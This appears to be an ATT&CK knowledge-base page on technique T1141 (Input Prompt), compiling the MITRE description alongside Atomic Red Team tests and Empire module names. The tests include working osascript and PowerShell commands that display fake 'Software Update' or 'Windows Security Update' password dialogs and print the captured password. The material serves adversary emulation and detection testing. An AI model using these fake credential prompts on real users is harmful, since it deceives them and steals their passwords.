
# Input Prompt

## Description

### MITRE Description

> When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['macOS', 'Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1141

## Potential Commands

```
osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'

# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
powershell/collection/prompt
powershell/collection/prompt
python/collection/osx/prompt
python/collection/osx/prompt
python/collection/osx/screensaver_alleyoop
python/collection/osx/screensaver_alleyoop
```

## Commands Dataset

```
[{'command': 'osascript -e \'tell app "System Preferences" to activate\' -e '
             '\'tell app "System Preferences" to activate\' -e \'tell app '
             '"System Preferences" to display dialog "Software Update requires '
             'that you type your password to apply changes." & return & '
             'return  default answer "" with icon 1 with hidden answer with '
             'title "Software Update"\'\n',
  'name': None,
  'source': 'atomics/T1141/T1141.yaml'},
 {'command': '# Creates GUI to prompt for password. Expect long pause before '
             'prompt is available.    \n'
             "$cred = $host.UI.PromptForCredential('Windows Security Update', "
             "'',[Environment]::UserName, [Environment]::UserDomainName)\n"
             '# Using write-warning to allow message to show on console as '
             'echo and other similar commands are not visable from the '
             'Invoke-AtomicTest framework.\n'
             'write-warning $cred.GetNetworkCredential().Password',
  'name': None,
  'source': 'atomics/T1141/T1141.yaml'},
 {'command': 'powershell/collection/prompt',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/prompt',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/prompt',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/prompt',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/screensaver_alleyoop',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/screensaver_alleyoop',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Input Prompt': {'atomic_tests': [{'description': 'Prompt '
                                                                           'User '
                                                                           'for '
                                                                           'Password '
                                                                           '(Local '
                                                                           'Phishing)\n'
                                                                           'Reference: '
                                                                           'http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n',
                                                            'executor': {'command': 'osascript '
                                                                                    '-e '
                                                                                    "'tell "
                                                                                    'app '
                                                                                    '"System '
                                                                                    'Preferences" '
                                                                                    'to '
                                                                                    "activate' "
                                                                                    '-e '
                                                                                    "'tell "
                                                                                    'app '
                                                                                    '"System '
                                                                                    'Preferences" '
                                                                                    'to '
                                                                                    "activate' "
                                                                                    '-e '
                                                                                    "'tell "
                                                                                    'app '
                                                                                    '"System '
                                                                                    'Preferences" '
                                                                                    'to '
                                                                                    'display '
                                                                                    'dialog '
                                                                                    '"Software '
                                                                                    'Update '
                                                                                    'requires '
                                                                                    'that '
                                                                                    'you '
                                                                                    'type '
                                                                                    'your '
                                                                                    'password '
                                                                                    'to '
                                                                                    'apply '
                                                                                    'changes." '
                                                                                    '& '
                                                                                    'return '
                                                                                    '& '
                                                                                    'return  '
                                                                                    'default '
                                                                                    'answer '
                                                                                    '"" '
                                                                                    'with '
                                                                                    'icon '
                                                                                    '1 '
                                                                                    'with '
                                                                                    'hidden '
                                                                                    'answer '
                                                                                    'with '
                                                                                    'title '
                                                                                    '"Software '
                                                                                    'Update"\'\n',
                                                                         'name': 'sh'},
                                                            'name': 'AppleScript '
                                                                    '- Prompt '
                                                                    'User for '
                                                                    'Password',
                                                            'supported_platforms': ['macos']},
                                                           {'description': 'Prompt '
                                                                           'User '
                                                                           'for '
                                                                           'Password '
                                                                           '(Local '
                                                                           'Phishing) '
                                                                           'as '
                                                                           'seen '
                                                                           'in '
                                                                           'Stitch '
                                                                           'RAT. '
                                                                           'Upon '
                                                                           'execution, '
                                                                           'a '
                                                                           'window '
                                                                           'will '
                                                                           'appear '
                                                                           'for '
                                                                           'the '
                                                                           'user '
                                                                           'to '
                                                                           'enter '
                                                                           'their '
                                                                           'credentials.\n'
                                                                           '\n'
                                                                           'Reference: '
                                                                           'https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n',
                                                            'executor': {'command': '# '
                                                                                    'Creates '
                                                                                    'GUI '
                                                                                    'to '
                                                                                    'prompt '
                                                                                    'for '
                                                                                    'password. '
                                                                                    'Expect '
                                                                                    'long '
                                                                                    'pause '
                                                                                    'before '
                                                                                    'prompt '
                                                                                    'is '
                                                                                    'available.    \n'
                                                                                    '$cred '
                                                                                    '= '
                                                                                    "$host.UI.PromptForCredential('Windows "
                                                                                    'Security '
                                                                                    "Update', "
                                                                                    "'',[Environment]::UserName, "
                                                                                    '[Environment]::UserDomainName)\n'
                                                                                    '# '
                                                                                    'Using '
                                                                                    'write-warning '
                                                                                    'to '
                                                                                    'allow '
                                                                                    'message '
                                                                                    'to '
                                                                                    'show '
                                                                                    'on '
                                                                                    'console '
                                                                                    'as '
                                                                                    'echo '
                                                                                    'and '
                                                                                    'other '
                                                                                    'similar '
                                                                                    'commands '
                                                                                    'are '
                                                                                    'not '
                                                                                    'visable '
                                                                                    'from '
                                                                                    'the '
                                                                                    'Invoke-AtomicTest '
                                                                                    'framework.\n'
                                                                                    'write-warning '
                                                                                    '$cred.GetNetworkCredential().Password',
                                                                         'elevation_required': False,
                                                                         'name': 'powershell'},
                                                            'name': 'PowerShell '
                                                                    '- Prompt '
                                                                    'User for '
                                                                    'Password',
                                                            'supported_platforms': ['windows']}],
                                          'attack_technique': 'T1141',
                                          'display_name': 'Input Prompt'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1141',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/prompt":  '
                                                                                 '["T1141"],',
                                            'Empire Module': 'powershell/collection/prompt',
                                            'Technique': 'Input Prompt'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1141',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/osx/prompt":  '
                                                                                 '["T1141"],',
                                            'Empire Module': 'python/collection/osx/prompt',
                                            'Technique': 'Input Prompt'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1141',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/osx/screensaver_alleyoop":  '
                                                                                 '["T1141"],',
                                            'Empire Module': 'python/collection/osx/screensaver_alleyoop',
                                            'Technique': 'Input Prompt'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations

None

# Actors


* [FIN4](../actors/FIN4.md)

